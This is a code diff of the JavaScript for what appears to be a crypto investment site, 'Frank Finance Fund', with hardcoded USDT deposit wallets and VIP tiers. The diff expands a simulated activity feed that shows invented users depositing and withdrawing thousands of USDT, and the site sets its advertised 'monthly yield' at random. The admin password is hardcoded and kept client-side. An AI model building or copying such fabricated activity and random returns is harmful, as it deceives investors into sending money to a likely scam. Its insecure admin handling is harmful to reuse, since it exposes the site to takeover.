@@ -32,10 +32,12 @@
 <div class="footer" id="siteFooter"></div>
 
 <script>
-// ==================== FIREBASE ====================
+// ==================== FIREBASE CONFIG ====================
 const firebaseConfig={apiKey:"AIzaSyBoAhmfYoeUy0crMeRQf9VBJJJ9kiH9gAs",authDomain:"frankfinancefund.firebaseapp.com",projectId:"frankfinancefund",storageBucket:"frankfinancefund.firebasestorage.app",messagingSenderId:"610440009057",appId:"1:610440009057:web:3a2886d19568103acfa120"};
 firebase.initializeApp(firebaseConfig);const db=firebase.firestore();db.enablePersistence().catch(()=>{});
 let isFirebaseConnected=false;db.enableNetwork().then(()=>{isFirebaseConnected=true;}).catch(()=>{isFirebaseConnected=false;});
+
+// ==================== STORAGE HELPERS ====================
 const SK='fff_u',SSK='fff_s',AK='fff_a',PK='fff_p',RK='fff_r',APK='fff_ap';const ADMIN_USERNAME="admin";const W={BEP20:"0x8c3742fcf57067a1723e5f08cae3b97d7bca530d",TRC20:"TXeKFgccxTkGjGQoRw1RVbxYBr7JQT21on"};
 function enc(d){try{let j=JSON.stringify(d);let e=btoa(unescape(encodeURIComponent(j)));return e.split('').reverse().join('');}catch(e){return'';}}
 function dec(e){try{let r=e.split('').reverse().join('');let j=decodeURIComponent(escape(atob(r)));return JSON.parse(j);}catch(e){return null;}}
@@ -48,34 +50,34 @@ async function fbGetROIRate(){let lr=sG(RK);if(!isFirebaseConnected)return lr;tr
 async function fbSaveROIRate(d){sS(RK,d);if(isFirebaseConnected){try{await db.collection('settings').doc('roi').set(d);}catch(e){}}}
 async function fbGetAdminPass(){let lp=sG(APK)||"FrankAdmin2026";if(!isFirebaseConnected)return lp;try{const d=await db.collection('settings').doc('admin').get();return d.exists?d.data().password:lp;}catch(e){return lp;}}
 async function fbSaveAdminPass(p){sS(APK,p);if(isFirebaseConnected){try{await db.collection('settings').doc('admin').set({password:p});}catch(e){}}}
+
 let users=[],su=null,pr=[],uc=null;
 async function loadData(){users=await fbGetUsers();su=sG(SSK)||null;pr=await fbGetPending();uc=su?users.find(u=>u.id===su.userId):null;}
 function cu(){return uc;}function rc(){return Math.floor(1000+Math.random()*9000).toString();}
 function gNP(n){if(n==='BEP20')return{ar:/^0x[a-fA-F0-9]{40}$/,ae:'0x... (42 hex chars)',tr:/^0x[a-fA-F0-9]{64}$/,te:'0x... (66 chars)'};if(n==='TRC20')return{ar:/^T[a-zA-Z0-9]{33}$/,ae:'T... (34 chars)',tr:/^[a-fA-F0-9]{64}$/,te:'64 hex chars'};return null;}
 function vA(a,n){let p=gNP(n);if(!p)return{valid:false,msg:'Invalid network'};if(!a)return{valid:false,msg:''};if(!p.ar.test(a))return{valid:false,msg:`Invalid ${n} address`};return{valid:true,msg:''};}
 function vT(t,n){let p=gNP(n);if(!p)return{valid:false,msg:'Invalid network'};if(!t)return{valid:false,msg:''};if(!p.tr.test(t))return{valid:false,msg:`Invalid ${n} TxID`};return{valid:true,msg:''};}
+
+// ==================== ROI ====================
 async function getMonthlyROIRate(){let s=await fbGetROIRate();let cm=new Date().getMonth()+'-'+new Date().getFullYear();if(s&&s.month===cm)return s.rate;let nr=5+Math.floor(Math.random()*11);await fbSaveROIRate({month:cm,rate:nr});return nr;}
 let currentROIRate=10;getMonthlyROIRate().then(r=>currentROIRate=r);
 function getROIRateClass(r){if(r<=7)return'rate-low';if(r<=11)return'rate-mid';return'rate-high';}
 function getROIIndicatorClass(r){if(r<=7)return'yield-active';if(r<=11)return'yield-high';return'yield-premium';}
 function getROILabel(r){if(r<=7)return'📈 '+r+'% Monthly Yield';if(r<=11)return'🔥 '+r+'% Monthly Yield';return'🚀 '+r+'% Monthly Yield';}
 
-// ==================== UNIFIED ACTIVITY FEED ====================
-const simNames=["Alex34","Morgan_7","Taylor99","Jordan_22","Casey_8","Riley_55","Quinn_3","Avery_11","Parker_6","Hayden_44","Sam_2024","Drew_88","Reese_17","Finley_9","Rowan_33","Blake_77","Cameron_5","Dakota_12","Emerson_44","Finley_2","Skylar_99","Sawyer_13","Harper_27","Remy_55","Jules_44"];
-const simActions=[{type:'deposit',icon:'fa-arrow-down',cls:'toast-deposit',verb:'deposited',min:100,max:8000},{type:'withdraw',icon:'fa-arrow-up',cls:'toast-withdraw',verb:'withdrew',min:50,max:5000},{type:'transfer',icon:'fa-exchange-alt',cls:'toast-transfer',verb:'transferred',min:30,max:3000},{type:'upgrade',icon:'fa-crown',cls:'toast-upgrade',verb:'upgraded to VIP',min:1,max:6,isVIP:true}];
-function addActivityToast(name,type,amount){
-    let container=document.getElementById('activityToasts');if(!container)return;
-    let action=simActions.find(a=>a.type===type)||simActions[0];
-    let msg=action.isVIP?`<span class="toast-user">${name}</span> <span class="toast-action">${action.verb} ${amount}</span>`:`<span class="toast-user">${name}</span> <span class="toast-action">${action.verb}</span> <span class="toast-amount">${amount} USDT</span>`;
-    let toast=document.createElement('div');toast.className='activity-toast';
-    toast.innerHTML=`<div class="toast-icon ${action.cls}"><i class="fas ${action.icon}"></i></div><div>${msg}</div>`;
-    container.appendChild(toast);
-    setTimeout(()=>{if(toast.parentNode)toast.remove();},6500);
-    if(container.children.length>3){container.removeChild(container.firstChild);}
-}
-function showSimActivity(){if(sG(AK)||window.location.search.includes('admin'))return;let name=simNames[Math.floor(Math.random()*simNames.length)];let action=simActions[Math.floor(Math.random()*simActions.length)];let amt=action.isVIP?action.min+Math.floor(Math.random()*(action.max-action.min+1)):(action.min+Math.random()*(action.max-action.min)).toFixed(2);addActivityToast(name,action.type,amt);}
-setInterval(showSimActivity,6000+Math.random()*8000);
+// ==================== REALISTIC ACTIVITY FEED ====================
+const simUserPool=["Alex_34","Morgan_7","Taylor_99","Jordan_22","Casey_8","Riley_55","Quinn_3","Avery_11","Parker_6","Hayden_44","Sam_2024","Drew_88","Reese_17","Finley_9","Rowan_33","Blake_77","Cameron_5","Dakota_12","Emerson_44","Finley_2","Skylar_99","Sawyer_13","Harper_27","Remy_55","Jules_44","Kendall_8","Logan_2023","Marley_16","Nico_90","Oakley_7","Peyton_33","Quincy_21","Rory_56","Sage_78","Tatum_14","Uriel_9","Val_2024","Wren_45","Xander_3","Yara_67","Zane_11","Arden_28","Briar_53","Cove_19","Delta_42","Echo_71","Fable_6","Grey_30","Haven_84","Indigo_5","Jasper_39","Kai_2024","Lane_48","Mica_22","Nova_66","Onyx_13","Pax_31","Quest_57","Rune_10","Skye_41","Teal_18","Uma_73","Vox_25","Wave_62","Xen_7","Yuki_36","Zion_49","Ash_2024","Bay_15","Cliff_38","Dune_52","Eden_20","Flint_64","Gale_29","Hawk_43","Iris_8","Jade_70","Knox_34","Lark_47","Mesa_12","Neon_59","Oren_26","Peak_81","Quill_4","Reef_37","Slate_51","Thorn_16","Urban_69","Vale_32","West_58","Xylo_23","Yard_41","Zeph_17","Amber_60","Blaze_27","Coral_54","Dusk_83","Ember_2","Frost_46","Glow_31","Haze_65","Ivy_19","Jolt_72","Kite_38","Luna_50","Mist_24","North_61","Opal_14","Pine_77","Rain_40","Snow_55","Tide_21"];
+let availableSimUsers=[],cooldownSimUsers=[];
+function getRandomSimUser(){if(availableSimUsers.length===0){availableSimUsers=[...cooldownSimUsers];cooldownSimUsers=[];availableSimUsers.sort(()=>Math.random()-0.5);}if(availableSimUsers.length===0&&cooldownSimUsers.length===0){availableSimUsers=[...simUserPool];availableSimUsers.sort(()=>Math.random()-0.5);}let idx=Math.floor(Math.random()*availableSimUsers.length);let user=availableSimUsers.splice(idx,1)[0];cooldownSimUsers.push(user);return user;}
+const simActions=[{type:'deposit',icon:'fa-arrow-down',cls:'toast-deposit',verb:'deposited',min:50,max:15000,weight:35},{type:'withdraw',icon:'fa-arrow-up',cls:'toast-withdraw',verb:'withdrew',min:30,max:8000,weight:25},{type:'transfer',icon:'fa-exchange-alt',cls:'toast-transfer',verb:'transferred',min:20,max:5000,weight:30},{type:'upgrade',icon:'fa-crown',cls:'toast-upgrade',verb:'upgraded to VIP',min:1,max:6,isVIP:true,weight:10}];
+function getRandomSimAction(){let tw=simActions.reduce((s,a)=>s+a.weight,0);let r=Math.random()*tw;let c=0;for(let a of simActions){c+=a.weight;if(r<=c)return a;}return simActions[0];}
+function generateAmount(min,max){let range=max-min;let biased=Math.pow(Math.random(),2);return(min+biased*range).toFixed(2);}
+function addActivityToast(name,type,amount){let container=document.getElementById('activityToasts');if(!container)return;let action=simActions.find(a=>a.type===type)||simActions[0];let msg=action.isVIP?`<span class="toast-user">${name}</span> <span class="toast-action">${action.verb} ${amount}</span>`:`<span class="toast-user">${name}</span> <span class="toast-action">${action.verb}</span> <span class="toast-amount">${amount} USDT</span>`;let toast=document.createElement('div');toast.className='activity-toast';toast.innerHTML=`<div class="toast-icon ${action.cls}"><i class="fas ${action.icon}"></i></div><div>${msg}</div>`;container.appendChild(toast);setTimeout(()=>{if(toast.parentNode)toast.remove();},6500);while(container.children.length>3){container.removeChild(container.firstChild);}}
+function showSimActivity(){if(sG(AK)||window.location.search.includes('admin'))return;let name=getRandomSimUser();let action=getRandomSimAction();let amt=action.isVIP?action.min+Math.floor(Math.random()*(action.max-action.min+1)):generateAmount(action.min,action.max);addActivityToast(name,action.type,amt);}
+function scheduleNextSim(){let delay=5000+Math.random()*7000;setTimeout(()=>{showSimActivity();scheduleNextSim();},delay);}
+scheduleNextSim();setTimeout(showSimActivity,2000);
 
+// ==================== VIP LEVELS & CRYPTO ====================
 const vl=[{level:0,dr:0,dl:0,ml:0,name:"Standard",color:"#94a3b8",icon:"user"},{level:1,dr:20,dl:100,ml:2000,name:"VIP 1",color:"#60a5fa",icon:"star"},{level:2,dr:50,dl:500,ml:10000,name:"VIP 2",color:"#34d399",icon:"star"},{level:3,dr:100,dl:2000,ml:31000,name:"VIP 3",color:"#2dd4bf",icon:"gem",popular:true},{level:4,dr:250,dl:5000,ml:80000,name:"VIP 4",color:"#a78bfa",icon:"gem"},{level:5,dr:500,dl:15000,ml:400000,name:"VIP 5",color:"#f472b6",icon:"crown"},{level:6,dr:1000,dl:50000,ml:1500000,name:"VIP 6",color:"#fcd535",icon:"crown"}];
 const cIds={BTC:"bitcoin",ETH:"ethereum",XRP:"ripple",BNB:"binancecoin",SOL:"solana",DOGE:"dogecoin",ADA:"cardano",DOT:"polkadot",LTC:"litecoin",AVAX:"avalanche-2",TRX:"tron",LINK:"chainlink"};
 const cs=["BTC","ETH","XRP","BNB","SOL","DOGE","ADA","DOT","LTC","AVAX","TRX","LINK"];const cF={BTC:"Bitcoin",ETH:"Ethereum",XRP:"XRP",BNB:"BNB",SOL:"Solana",DOGE:"Dogecoin",ADA:"Cardano",DOT:"Polkadot",LTC:"Litecoin",AVAX:"Avalanche",TRX:"TRON",LINK:"Chainlink"};
